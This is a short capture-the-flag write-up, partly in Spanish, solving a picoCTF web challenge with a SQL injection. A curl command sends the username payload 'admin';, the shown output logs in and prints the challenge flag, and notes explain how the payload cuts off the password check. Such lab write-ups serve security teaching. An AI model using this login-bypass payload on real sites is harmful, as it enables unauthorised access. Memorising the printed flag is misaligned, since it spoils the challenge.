## Description

There is a website running at `https://jupiter.challenges.picoctf.org/problem/53751/` ([link](https://jupiter.challenges.picoctf.org/problem/53751/)). Someone has bypassed the login before, and now it's being strengthened. Try to see if you can still login! or http://jupiter.challenges.picoctf.org:53751
#### hints
- The password is being filtered.
## Solución
```shell
┌──(kali㉿kali)-[~]
└─$ curl https://jupiter.challenges.picoctf.org/problem/53751/login.php -d "username=admin';&password=toromax&debug=1"
<pre>username: admin';
password: toromax
SQL query: SELECT * FROM users WHERE name='admin';' AND password='toromax'
</pre><h1>Logged in!</h1><p>Your flag is: picoCTF{m0R3_SQL_plz_c34df170}</p>                                                                                                                             
┌──(kali㉿kali)-[~]
└─$ 

```
## Bandera
```css
flag: picoCTF{m0R3_SQL_plz_c34df170}
```
## Notas Adicionales
En este caso, se utilizó nuevamente una inyección SQL para acceder a una página de inicio de sesión. Se envió la cadena `"admin';"` como nombre de usuario, lo que cerró prematuramente la consulta SQL original, permitiendo el inicio de sesión sin importar la contraseña (`toromax`). Esto resultó en la ejecución de una consulta SQL válida que omitió la verificación de la contraseña, y permitió acceder al sistema, revelando la bandera
# comandos utilizados

## Referencias
